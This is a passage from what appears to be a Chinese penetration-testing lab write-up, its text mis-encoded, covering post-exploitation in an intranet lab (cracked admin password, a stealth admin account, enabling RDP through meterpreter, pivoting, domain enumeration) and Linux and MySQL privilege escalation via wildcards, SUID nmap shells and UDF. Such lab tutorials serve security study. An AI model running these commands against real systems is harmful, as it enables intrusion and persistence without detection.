<span class="hljs-number">94</span> a7 <span class="hljs-number">90</span> e6 <span class="hljs-built_in">d5</span> <span class="hljs-number">4</span>f ce a8 <span class="hljs-number">88</span> <span class="hljs-number">9</span>e a5 <span class="hljs-number">18</span> <span class="hljs-number">78</span> e4 <span class="hljs-number">43</span> e8 <span class="hljs-number">5</span>b e5 <span class="hljs-number">47</span> dc <span class="hljs-number">0</span>a <span class="hljs-number">34</span> be <span class="hljs-number">79</span> <span class="hljs-number">6</span>a fa fe <span class="hljs-number">7</span>f <span class="hljs-built_in">d5</span> <span class="hljs-built_in">c6</span> <span class="hljs-number">38</span> <span class="hljs-number">48</span> <span class="hljs-number">79</span> <span class="hljs-number">53</span> <span class="hljs-number">7</span>b <span class="hljs-number">3</span>f <span class="hljs-number">8</span>f <span class="hljs-number">9</span>e <span class="hljs-number">78</span> <span class="hljs-number">31</span> cf <span class="hljs-number">35</span> <span class="hljs-number">7</span>b <span class="hljs-number">12</span> <span class="hljs-number">93</span> e7 <span class="hljs-number">3</span>a <span class="hljs-built_in">f1</span> <span class="hljs-number">0</span>c de <span class="hljs-number">90</span> <span class="hljs-built_in">d9</span> e5 <span class="hljs-number">69</span> <span class="hljs-number">02</span> a9 ab <span class="hljs-built_in">c6</span> da <span class="hljs-built_in">f2</span> <span class="hljs-number">09</span> <span class="hljs-number">2</span>f <span class="hljs-number">8</span>a <span class="hljs-number">0</span>a ed <span class="hljs-number">19</span> <span class="hljs-number">44</span> <span class="hljs-number">11</span> <span class="hljs-built_in">c4</span> ba <span class="hljs-number">93</span> <span class="hljs-number">12</span> <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">69</span> <span class="hljs-number">3</span>a <span class="hljs-number">31</span> <span class="hljs-number">4</span>e ff b8 a7 <span class="hljs-number">72</span> da <span class="hljs-number">4</span>b <span class="hljs-number">6</span>e ad db e9 <span class="hljs-number">52</span> <span class="hljs-number">7</span>f <span class="hljs-number">88</span> cf <span class="hljs-number">0</span>f <span class="hljs-number">01</span> <span class="hljs-number">92</span> <span class="hljs-number">87</span> <span class="hljs-number">68</span> ba <span class="hljs-number">5</span>a <span class="hljs-built_in">d1</span> <span class="hljs-built_in">d3</span> ec <span class="hljs-number">1</span>f <span class="hljs-built_in">c3</span> b1 a5 <span class="hljs-number">3</span>b <span class="hljs-number">44</span> e5 <span class="hljs-number">7</span>b <span class="hljs-number">9</span>d <span class="hljs-number">2</span>f a9 <span class="hljs-number">28</span> <span class="hljs-number">5</span>b</code></pre><p>å¯ä»¥çœ‹åˆ°å¯†ç å·²ç»è¢«ç ´è§£å¤„ç†</p><pre><code class="hljs angelscript">passwordï¼š<span class="hljs-symbol">hongrisec@</span><span class="hljs-number">2019</span></code></pre><h3 id="è¿œç¨‹æ¡Œé¢ç™»å½•"><a href="#è¿œç¨‹æ¡Œé¢ç™»å½•" class="headerlink" title="è¿œç¨‹æ¡Œé¢ç™»å½•"></a>è¿œç¨‹æ¡Œé¢ç™»å½•</h3><p>å·²ç»è·å¾—äº†administratorçš„è´¦å·å’Œå¯†ç ï¼Œç°åœ¨æˆ‘ä»¬æ—¢å¯ä»¥ä½¿ç”¨administratorè´¦å·ç™»å½•ï¼Œä¹Ÿå¯ä»¥æ–°å»ºè´¦å·ç™»å½•ã€‚</p><p>ç›´æ¥ä½¿ç”¨administratorç™»å½•çš„è¯å¯èƒ½è¢«ç®¡ç†å‘˜å‘ç°ï¼Œæ‰€ä»¥ä½¿ç”¨ç¬¬äºŒç§æ–¹æ³•</p><pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> hack <span class="hljs-keyword">password</span>  /<span class="hljs-keyword">add</span>net localgroup administrators hack /<span class="hljs-keyword">add</span></code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511183802017.png" alt="image-20210511183802017" style="zoom: 50%;"><p>æŸ¥çœ‹ä¸»æœºæ˜¯å¦å¼€å¯<code>3389</code>ç«¯å£</p><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">3389</span> -v <span class="hljs-number">192.168.74.129</span></code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184005186.png" alt="image-20210511184005186" style="zoom:50%;"><p>å¯ä»¥å‘ç°æ˜¯å…³é—­çš„ã€‚</p><p>ä½¿ç”¨meterpreter,æ‰“å¼€è¯¥ç«¯å£(è¿è¡Œä¹‹å‰å¥½åƒéœ€è¦é‡æ–°å¼¹å‡ºshell,ç›´æ¥è¿è¡Œæ²¡æœ‰æˆåŠŸ)</p><pre><code class="hljs awk">run post<span class="hljs-regexp">/windows/m</span>anage/enable_rdp</code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184531850.png" alt="image-20210511184531850" style="zoom:67%;"><p>å†æ¬¡æ‰«æå°±ä¼šå‘ç°3389ç«¯å£å·²ç»æ‰“å¼€</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184630200.png" alt="image-20210511184630200" style="zoom:67%;"><p>ç›´æ¥è¿æ¥å³å¯</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511185014529.png" alt="image-20210511185014529" style="zoom:50%;"><h3 id="æ·»åŠ è·¯ç”±ã€æŒ‚Socks4aä»£ç†"><a href="#æ·»åŠ è·¯ç”±ã€æŒ‚Socks4aä»£ç†" class="headerlink" title="æ·»åŠ è·¯ç”±ã€æŒ‚Socks4aä»£ç†"></a>æ·»åŠ è·¯ç”±ã€æŒ‚Socks4aä»£ç†</h3><ul><li><p>æ·»åŠ è·¯ç”±çš„ç›®çš„æ˜¯ä¸ºäº†è®©æˆ‘ä»¬çš„MSFå…¶ä»–æ¨¡å—èƒ½è®¿é—®å†…ç½‘çš„å…¶ä»–ä¸»æœº</p></li><li><p>æ·»åŠ socks4aä»£ç†çš„ç›®çš„æ˜¯ä¸ºäº†è®©å…¶ä»–è½¯ä»¶æ›´æ–¹ä¾¿çš„è®¿é—®åˆ°å†…ç½‘çš„å…¶ä»–ä¸»æœºçš„æœåŠ¡</p></li></ul><p>æ³¨ï¼šæ·»åŠ è·¯ç”±ä¸€å®šè¦åœ¨æŒ‚ä»£ç†ä¹‹å‰ï¼Œå› ä¸ºä»£ç†éœ€è¦ç”¨åˆ°è·¯ç”±åŠŸèƒ½</p><p>åœ¨è·å–<code>shell</code>çš„æœºå™¨ä¸Šæ·»åŠ è·¯ç”±</p><pre><code class="hljs routeros">meterpreter &gt; <span class="hljs-builtin-name">run</span> get_local_subnetsmeterpreter &gt; <span class="hljs-builtin-name">run</span> autoroute -s 192.168.21.0/24<span class="hljs-comment"># æ·»åŠ è·¯ç”±</span>meterpreter &gt; <span class="hljs-builtin-name">run</span> autoroute -p<span class="hljs-comment"># æ˜¾ç¤ºè·¯ç”±</span>meterpreter &gt;<span class="hljs-built_in"> route </span>flush <span class="hljs-comment"># åˆ é™¤</span></code></pre><p>ä½¿ç”¨<code>run post/windows/gather/arp_scanner RHOSTS=192.168.21.0/24</code>ï¼ŒæŸ¥çœ‹å­˜æ´»çš„ä¸»æœº</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511193307727.png" alt="image-20210511193307727" style="zoom: 50%;"><p>ç„¶åå»ºç«‹<code>socks4</code>ä»£ç†</p><pre><code class="hljs pgsql">meterpreter &gt; backgroundmsf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; use auxiliary/<span class="hljs-keyword">server</span>/socks4amsf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; <span class="hljs-keyword">set</span> srvhost <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>msf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; <span class="hljs-keyword">set</span> srvport <span class="hljs-number">1080</span>msf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; run</code></pre><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210511195019515.png" alt="image-20210511195019515" style="zoom:50%;"><p>è®¾ç½®å®Œä»£ç†åæ”»å‡»è€…ä¸»æœºå°±å¯ä»¥è®¿é—®å†…ç½‘äº†</p><h2 id="åŸŸä¿¡æ¯æ”¶é›†"><a href="#åŸŸä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸŸä¿¡æ¯æ”¶é›†"></a>åŸŸä¿¡æ¯æ”¶é›†</h2><pre><code class="hljs jboss-cli">net time <span class="hljs-string">/domain</span>        <span class="hljs-comment">#æŸ¥çœ‹æ—¶é—´æœåŠ¡å™¨</span>net user <span class="hljs-string">/domain</span>        <span class="hljs-comment">#æŸ¥çœ‹åŸŸç”¨æˆ·</span>net view <span class="hljs-string">/domain</span>        <span class="hljs-comment">#æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸ</span>net group <span class="hljs-string">&quot;domain computers&quot;</span> <span class="hljs-string">/domain</span>         <span class="hljs-comment">#æŸ¥çœ‹åŸŸå†…æ‰€æœ‰çš„ä¸»æœºå</span>net group <span class="hljs-string">&quot;domain admins&quot;</span>   <span class="hljs-string">/domain</span>          <span class="hljs-comment">#æŸ¥çœ‹åŸŸç®¡ç†å‘˜</span>net group <span class="hljs-string">&quot;domain controllers&quot;</span> <span class="hljs-string">/domain</span>       <span class="hljs-comment">#æŸ¥çœ‹åŸŸæ§</span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200502702.png" alt="image-20210511200502702" style="zoom:50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200553874.png" alt="image-20210511200553874" style="zoom:50%;"></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200623757.png" alt="image-20210511200623757" style="zoom:50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200650884.png" alt="image-20210511200650884" style="zoom:50%;"></p><p>æ±‡æ€»</p><p>ä»åŸŸä¿¡æ¯æ”¶é›†å¯ä»¥å¾—åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š</p><ul><li><p>åŸŸï¼šgod.org</p></li><li><p>åŸŸå†…æœ‰ä¸‰ä¸ªç”¨æˆ·ï¼šadministratorã€ligangã€liukaifeng01</p></li><li><p>åŸŸå†…æœ‰ä¸‰å°ä¸»æœºï¼šDEV1(ä¸åœ¨æ­¤ç¯å¢ƒä¸­)ã€ROOT-TVI862UBEHã€STU1</p></li><li><p>åŸŸæ§ï¼šOWA(192.168.52.138)</p></li><li><p>åŸŸç®¡ç†å‘˜ï¼šadministrator</p></li></ul><p>ç”±æ­¤å¯è§ï¼Œæˆ‘ä»¬ç°åœ¨è·å¾—çš„å³æ˜¯åŸŸç®¡ç†å‘˜æƒé™ã€‚æ­¤ç¯å¢ƒå†…è¿˜æœ‰ä¸€å°ROOT-TVI862UBEH(192.168.52.141)å’ŒåŸŸæ§OWA(192.168.52.138)ã€‚</p><h3 id="å†…ç½‘ä¸»æœºä¿¡æ¯æ”¶é›†"><a href="#å†…ç½‘ä¸»æœºä¿¡æ¯æ”¶é›†" class="headerlink" title="å†…ç½‘ä¸»æœºä¿¡æ¯æ”¶é›†"></a>å†…ç½‘ä¸»æœºä¿¡æ¯æ”¶é›†</h3><p>è¿œç¨‹ç™»å½•æ¡Œé¢åä¼šçœ‹åˆ°ä¸€ä¸ªNmapåº”ç”¨ï¼Œå¯ä»¥ç”¨è¿™ä¸ªæ¢æµ‹å†…ç½‘ä¸»æœº</p><p>å½“ç„¶ä¹‹å‰å·²ç»è®¾ç½®å®Œä»£ç†äº†ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨kaliä¸­çš„msfæ¢æµ‹</p><h3 id="å†…ç½‘å­˜æ´»ä¸»æœºæ¢æµ‹"><a href="#å†…ç½‘å­˜æ´»ä¸»æœºæ¢æµ‹" class="headerlink" title="å†…ç½‘å­˜æ´»ä¸»æœºæ¢æµ‹"></a>å†…ç½‘å­˜æ´»ä¸»æœºæ¢æµ‹</h3><p>å› ä¸ºä¹‹å‰çš„ä»£ç†æ­å»ºå­˜åœ¨é—®é¢˜ï¼Œå¯¼è‡´è¿™ä¸€æ­¥ä¸èƒ½åšï¼Œå°±åœ¨ç½‘ä¸Šæ‰¾äº†ä¸€äº›ç›¸å…³æ“ä½œ</p><p>åœ¨åŸŸç¯å¢ƒæ¸—é€ä¸­å¯ä»¥çœç•¥ï¼Œå› ä¸ºä½¿ç”¨åŸŸå‘½ä»¤å¯ä»¥ç›´æ¥æŸ¥è¯¢åŸŸä¸­æœ‰å“ªäº›ä¸»æœºã€‚åœ¨éåŸŸç¯å¢ƒä¸­æ¸—é€ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸€æ­¥ã€‚åœ¨è¿™é‡Œé¡ºå¸¦æä¸€ä¸‹è¿™ä¸ªç”¨æ³•ã€‚æ›´å¤šçš„å…³äºä½¿ç”¨MSFè¿›è¡Œå†…ç½‘æ¢æµ‹ï¼Œä¼ é€é—¨ï¼š<a href="https://blog.csdn.net/qq_36119192/article/details/92556219">åæ¸—é€é˜¶æ®µä¹‹åŸºäºMSFçš„å†…ç½‘ä¸»æœºæ¢æµ‹</a></p><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_sweep    <span class="hljs-comment">#åŸºäºudpåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº</span>auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_probe    <span class="hljs-comment">#åŸºäºudpåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº</span>auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname         <span class="hljs-comment">#åŸºäºnetbiosåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº</span></code></pre><h3 id="å†…ç½‘å­˜æ´»ä¸»æœºç«¯å£æ‰«æ"><a href="#å†…ç½‘å­˜æ´»ä¸»æœºç«¯å£æ‰«æ" class="headerlink" title="å†…ç½‘å­˜æ´»ä¸»æœºç«¯å£æ‰«æ"></a>å†…ç½‘å­˜æ´»ä¸»æœºç«¯å£æ‰«æ</h3><p><strong>ä½¿ç”¨MSFè‡ªå¸¦æ¨¡å—è¿›è¡Œç«¯å£æ¢æµ‹</strong></p><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>portscan/tcp           <span class="hljs-comment">#åŸºäºtcpè¿›è¡Œç«¯å£æ‰«æ(é»˜è®¤æ‰«æ1-10000)</span></code></pre><p><strong>ä¹Ÿå¯ä»¥ç”¨nmapæ‰«æ</strong></p><h3 id="å†…ç½‘å­˜æ´»ä¸»æœºæœåŠ¡æ¢æµ‹"><a href="#å†…ç½‘å­˜æ´»ä¸»æœºæœåŠ¡æ¢æµ‹" class="headerlink" title="å†…ç½‘å­˜æ´»ä¸»æœºæœåŠ¡æ¢æµ‹"></a>å†…ç½‘å­˜æ´»ä¸»æœºæœåŠ¡æ¢æµ‹</h3><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>ftp/ftp_version            <span class="hljs-comment">#å‘ç°å†…ç½‘ftpæœåŠ¡ï¼ŒåŸºäºé»˜è®¤21ç«¯å£</span>auxiliary<span class="hljs-regexp">/scanner/</span>ssh/ssh_version            <span class="hljs-comment">#å‘ç°å†…ç½‘sshæœåŠ¡ï¼ŒåŸºäºé»˜è®¤22ç«¯å£</span>auxiliary<span class="hljs-regexp">/scanner/</span>telnet/telnet_version      <span class="hljs-comment">#å‘ç°å†…ç½‘telnetæœåŠ¡ï¼ŒåŸºäºé»˜è®¤23ç«¯å£</span>auxiliary<span class="hljs-regexp">/scanner/</span>dns/dns_amp                <span class="hljs-comment">#å‘ç°dnsæœåŠ¡ï¼ŒåŸºäºé»˜è®¤53ç«¯å£</span>auxiliary<span class="hljs-regexp">/scanner/</span>http/http_version          <span class="hljs-comment">#å‘ç°å†…ç½‘httpæœåŠ¡ï¼ŒåŸºäºé»˜è®¤80ç«¯å£</span>auxiliary<span class="hljs-regexp">/scanner/</span>http/title                 <span class="hljs-comment">#æ¢æµ‹å†…ç½‘httpæœåŠ¡çš„æ ‡é¢˜</span>auxiliary<span class="hljs-regexp">/scanner/</span>smb/smb_version            <span class="hljs-comment">#å‘ç°å†…ç½‘smbæœåŠ¡ï¼ŒåŸºäºé»˜è®¤çš„445ç«¯å£   </span>auxiliary<span class="hljs-regexp">/scanner/m</span>ssql/mssql_schemadump     <span class="hljs-comment">#å‘ç°å†…ç½‘SQLServeræœåŠ¡,åŸºäºé»˜è®¤çš„1433ç«¯å£</span>auxiliary<span class="hljs-regexp">/scanner/</span>oracle/oracle_hashdump     <span class="hljs-comment">#å‘ç°å†…ç½‘oracleæœåŠ¡,åŸºäºé»˜è®¤çš„1521ç«¯å£ </span>auxiliary<span class="hljs-regexp">/scanner/my</span>sql/mysql_version        <span class="hljs-comment">#å‘ç°å†…ç½‘mysqlæœåŠ¡ï¼ŒåŸºäºé»˜è®¤3306ç«¯å£</span>auxiliary<span class="hljs-regexp">/scanner/</span>rdp/rdp_scanner            <span class="hljs-comment">#å‘ç°å†…ç½‘RDPæœåŠ¡ï¼ŒåŸºäºé»˜è®¤3389ç«¯å£</span>auxiliary<span class="hljs-regexp">/scanner/</span>redis/redis_server         <span class="hljs-comment">#å‘ç°å†…ç½‘RedisæœåŠ¡ï¼ŒåŸºäºé»˜è®¤6379ç«¯å£</span>auxiliary<span class="hljs-regexp">/scanner/</span>db2/db2_version            <span class="hljs-comment">#æ¢æµ‹å†…ç½‘çš„db2æœåŠ¡ï¼ŒåŸºäºé»˜è®¤çš„50000ç«¯å£</span>auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname             <span class="hljs-comment">#æ¢æµ‹å†…ç½‘ä¸»æœºçš„netbiosåå­—</span></code></pre><h1 id="ææƒå¤ç°"><a href="#ææƒå¤ç°" class="headerlink" title="ææƒå¤ç°"></a>ææƒå¤ç°</h1><h2 id="é€šé…ç¬¦ææƒ"><a href="#é€šé…ç¬¦ææƒ" class="headerlink" title="é€šé…ç¬¦ææƒ"></a>é€šé…ç¬¦ææƒ</h2><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>é€šé…ç¬¦æ˜¯ä¸€ä¸ªå­—ç¬¦æˆ–ä¸€ç»„å­—ç¬¦ï¼Œå¯ä»¥ç”¨æ¥æ›¿æ¢æŸäº›èŒƒå›´/ç±»åˆ«çš„å­—ç¬¦ã€‚åœ¨æ‰§è¡Œä»»ä½•å…¶ä»–æ“ä½œä¹‹å‰ï¼Œé€šé…ç¬¦é¦–å…ˆè¦ç»è¿‡shellè¿›è¡Œè§£é‡Šã€‚</p><p>ä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„é€šé…ç¬¦ï¼š</p><p>*   æ˜Ÿå·å¯ä»¥ä¸æ–‡ä»¶åä¸­çš„ä»»æ„æ•°é‡çš„å­—ç¬¦åŒ¹é…ï¼ŒåŒ…æ‹¬0ä¸ªå­—ç¬¦ã€‚</p><p> ?   é—®å·ç”¨äºåŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦ã€‚</p><p>[ ]  æ‹¬å·å†…åŒ…æ‹¬ä¸€ç»„å­—ç¬¦ï¼Œå…¶ä¸­ä»»ä½•ä¸€ä¸ªå­—ç¬¦éƒ½å¯ä»¥åŒ¹é…è¯¥ä½ç½®ä¸Šçš„å•ä¸ªå­—ç¬¦ã€‚</p><p> â€“   []ä¸­çš„è¿å­—ç¬¦è¡¨ç¤ºå­—ç¬¦èŒƒå›´ã€‚</p><p>~   å•è¯å¼€å¤´çš„æ³¢æµªç¬¦è¡¨ç¤ºå½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•çš„åç§°ã€‚å¦‚æœè¯¥å­—ç¬¦åé¢æ˜¯å¦ä¸€ä¸ªç”¨æˆ·çš„ç™»å½•åï¼Œåˆ™è¡¨ç¤ºè¯¥ç”¨æˆ·çš„ä¸»ç›®å½•ã€‚</p><p><strong>åˆ©ç”¨chownçš„<code>--reference</code>å‚æ•°ææƒ</strong></p><p>â€“reference=&lt;å‚è€ƒæ–‡ä»¶æˆ–ç›®å½•&gt;ï¼šæŠŠæŒ‡å®šæ–‡ä»¶æˆ–ç›®å½•çš„æ‰€æœ‰è€…ä¸æ‰€å±ç»„ï¼Œç»Ÿç»Ÿè®¾ç½®æˆå’Œå‚è€ƒæ–‡ä»¶æˆ–ç›®å½•çš„æ‰€æœ‰è€…ä¸æ‰€å±ç»„ç›¸åŒã€‚</p><h3 id="æœ¬åœ°ææƒ"><a href="#æœ¬åœ°ææƒ" class="headerlink" title="æœ¬åœ°ææƒ"></a>æœ¬åœ°ææƒ</h3><p>å®éªŒç¯å¢ƒ<code>ubuntu18.04</code></p><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªhackerç”¨æˆ·</p><pre><code class="hljs ebnf"><span class="hljs-attribute">adduser hacker</span></code></pre><p>ç™»å½•sunzyè´¦å·ï¼Œåœ¨<code>home/sunzy/test</code> éšä¾¿å†™ä¸€äº›æ–‡ä»¶ï¼Œä½œä¸ºå®éªŒå‚è€ƒå¯¹è±¡</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210417165902255.png" alt="image-20210417165902255"></p><p>ç™»å½•hackerè´¦å·ï¼Œå¹¶ä¸”åœ¨testç›®å½•ä¸‹å†™ä¸¤ä¸ªæ–‡ä»¶</p><p>è¿™é‡Œéœ€è¦å®éªŒsuå‘½ä»¤æå‡æƒé™ï¼Œå¹¶ä¸”å°†æ‰€æœ‰è€…å’Œç”¨æˆ·ç»„æ”¹ä¸ºhacker</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210417170157713.png" alt="image-20210417170157713"></p><p>å…¶ä¸­hacker.phpä¸â€™â€“reference=hacker.phpâ€™ä¸­çš„åå­—éœ€è¦ä¸€è‡´</p><p>ä½¿ç”¨rootæƒé™åœ¨<code>/home/sunzy/test/</code>æ‰§è¡Œ</p><pre><code class="hljs apache"><span class="hljs-attribute">chown</span> -R hacker<span class="hljs-number">1</span>:hacker<span class="hljs-number">1</span> *.php</code></pre><p>ç»“æœå¦‚ä¸‹ï¼Œå‘ç°ï¼Œå±äº<code>sunzy</code>ç”¨æˆ·çš„æ–‡ä»¶ï¼Œç°åœ¨å±äºhackerï¼Œè¿™æ ·hackerå°±å¯ä»¥å¯¹è¿™äº›æ–‡ä»¶è¿›è¡Œè¯»å†™æ“ä½œã€‚</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210417165619087.png" alt="image-20210417165619087" style="zoom:50%;"><h2 id="linux-SUIDææƒ"><a href="#linux-SUIDææƒ" class="headerlink" title="linux SUIDææƒ"></a>linux SUIDææƒ</h2><h3 id="å…³äºSUID"><a href="#å…³äºSUID" class="headerlink" title="å…³äºSUID"></a>å…³äºSUID</h3><p>SUIDï¼ˆè®¾ç½®ç”¨æˆ·IDï¼‰æ˜¯èµ‹äºˆæ–‡ä»¶çš„ä¸€ç§æƒé™ï¼Œå®ƒä¼šå‡ºç°åœ¨æ–‡ä»¶æ‹¥æœ‰è€…æƒé™çš„æ‰§è¡Œä½ä¸Šï¼Œå…·æœ‰è¿™ç§æƒé™çš„æ–‡ä»¶ä¼šåœ¨å…¶æ‰§è¡Œæ—¶ï¼Œä½¿è°ƒç”¨è€…æš‚æ—¶è·å¾—è¯¥æ–‡ä»¶æ‹¥æœ‰è€…çš„æƒé™ã€‚</p><h3 id="æŸ¥æ‰¾å…·æœ‰-SUID-æƒé™ä½æ–‡ä»¶"><a href="#æŸ¥æ‰¾å…·æœ‰-SUID-æƒé™ä½æ–‡ä»¶" class="headerlink" title="æŸ¥æ‰¾å…·æœ‰ SUID æƒé™ä½æ–‡ä»¶"></a>æŸ¥æ‰¾å…·æœ‰ SUID æƒé™ä½æ–‡ä»¶</h3><p>ä»¥ä¸‹å‘½ä»¤å¯ä»¥æ‰¾åˆ°æ­£åœ¨ç³»ç»Ÿä¸Šè¿è¡Œçš„æ‰€æœ‰SUIDå¯æ‰§è¡Œæ–‡ä»¶ã€‚å‡†ç¡®çš„è¯´ï¼Œè¿™ä¸ªå‘½ä»¤å°†ä»/ç›®å½•ä¸­æŸ¥æ‰¾å…·æœ‰SUIDæƒé™ä½ä¸”å±ä¸»ä¸ºrootçš„æ–‡ä»¶å¹¶è¾“å‡ºå®ƒä»¬ï¼Œç„¶åå°†æ‰€æœ‰é”™è¯¯é‡å®šå‘åˆ°/dev/nullï¼Œä»è€Œä»…åˆ—å‡ºè¯¥ç”¨æˆ·å…·æœ‰è®¿é—®æƒé™çš„é‚£äº›äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -user root -perm -4000 -<span class="hljs-builtin-name">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><span class="hljs-builtin-name">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</code></pre><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>sudo -l</code> å‘½ä»¤åˆ—å‡ºå½“å‰ç”¨æˆ·å¯æ‰§è¡Œçš„å‘½ä»¤</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210425233650739.png" alt="image-20210425233650739" style="zoom:50%;"><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p><strong>nmap</strong></p><p>nmapï¼ˆ2.02-5.21ï¼‰å­˜åœ¨äº¤æ¢æ¨¡å¼ï¼Œå¯åˆ©ç”¨ææƒ</p><pre><code class="hljs ada">nmap <span class="hljs-comment">--interactive</span></code></pre><p>ä¹‹åæ‰§è¡Œ:</p><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span>&gt; !sh<span class="hljs-attribute">sh</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span># whoami<span class="hljs-attribute">root</span></code></pre><p>msfä¸­çš„æ¨¡å—ä¸ºï¼š</p><pre><code class="hljs awk">exploit<span class="hljs-regexp">/unix/</span>local/setuid_nmap</code></pre><p>è¾ƒæ–°ç‰ˆå¯ä½¿ç”¨ <code>--script</code> å‚æ•°ï¼š</p><pre><code class="hljs arcade">echo <span class="hljs-string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; <span class="hljs-regexp">/tmp/</span>shell.nse &amp;&amp; sudo nmap --script=<span class="hljs-regexp">/tmp/</span>shell.nse</code></pre><p>kali nmap 7.7 ææƒæˆåŠŸï¼š</p><p><img src="https://jlkl.github.io/2020/01/27/Web_15/20200127154030.png" alt></p><h2 id="mysql-UDFææƒ"><a href="#mysql-UDFææƒ" class="headerlink" title="mysql UDFææƒ"></a>mysql UDFææƒ</h2><h3 id="UDFææƒåŸç†"><a href="#UDFææƒåŸç†" class="headerlink" title="UDFææƒåŸç†"></a>UDFææƒåŸç†</h3><p>UDFæŒ‡çš„æ˜¯ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œç”¨æˆ·å¯ä»¥å¯¹æ•°æ®åº“æ‰€ä½¿ç”¨çš„å‡½æ•°è¿›è¡Œä¸€ä¸ªæ‰©å±•ï¼ˆåˆ©ç”¨dllæ–‡ä»¶ï¼‰ï¼Œä»è€Œå®šåˆ¶ä¸€äº›ç¬¦åˆè‡ªå·±éœ€æ±‚çš„å‡½æ•°ï¼Œä½†æ˜¯åŒæ ·çš„ï¼Œå½“é»‘å®¢è·å–äº†æ•°æ®åº“çš„rootç”¨æˆ·çš„ä¸€ä¸ªæƒé™æ—¶ï¼Œå³ä½¿æ‰€åœ¨çš„ç³»ç»Ÿæƒé™å¾ˆä½ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨UDFæ¥è‡ªå®šä¹‰ä¸€ä¸ªæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œä½†æ˜¯æ‰§è¡Œæƒé™ä¸ºç®¡ç†å‘˜æƒé™ï¼Œä»è€Œå¯ä»¥ç”¨æ¥æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·ï¼Œè¿œç¨‹è¿æ¥ã€‚</p><p>è¿™é‡Œä½¿ç”¨mysqlè¿›è¡Œå¤ç°ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦æ‹¥æœ‰mysqlæ•°æ®åº“çš„rootæƒé™ï¼Œç”±äºmysqlçš„ç‰ˆæœ¬ä¸åŒï¼Œudfææƒçš„æ–¹å¼ä¹Ÿä¸åŒã€‚</p><p>mysqlç‰ˆæœ¬&gt;5.1 éœ€è¦åœ¨mysqlçš„å®‰è£…ç›®å½•ä¸‹åˆ›å»º lib\plugin è¿™ä¸ªæ–‡ä»¶å¤¹ï¼ˆé»˜è®¤ä¸å­˜åœ¨ï¼‰ï¼Œä¹‹åå°†æŠŠdllæ–‡ä»¶æ”¾åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼›<br>mysqlç‰ˆæœ¬&lt;5.1 éœ€è¦å°†dllæ–‡ä»¶æ”¾åœ¨ C:\windows\æˆ–C:\windows\system32ã€‚</p><p>ç„¶ååŠ 